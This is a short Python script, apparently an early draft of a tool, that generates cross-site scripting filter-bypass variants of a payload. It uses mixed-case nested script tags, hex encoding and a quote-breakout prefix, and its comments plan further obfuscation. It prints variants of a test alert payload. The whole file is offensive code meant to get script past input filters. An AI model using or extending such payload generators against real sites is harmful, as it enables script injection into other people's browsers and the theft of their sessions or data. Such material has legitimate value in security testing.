#new file
import codecs
import html

def xss_reflected_bypass(string):
    a = []
    a.append(string.replace("<script>","<<ScRipT>").replace("</script>","//<</sCrIPt>"))
    hexlify = codecs.getencoder('hex')
    a.append(hexlify(string.encode('utf-8'))[0])
    #Add Hex Encoder
    #Add String.FromCharCode()
    #Add Obfusation
    a.append("\">" + string.replace("\"","\\").replace("\'","\\"))
    return a


print(xss_reflected_bypass("<script>alert('test');</script>"))
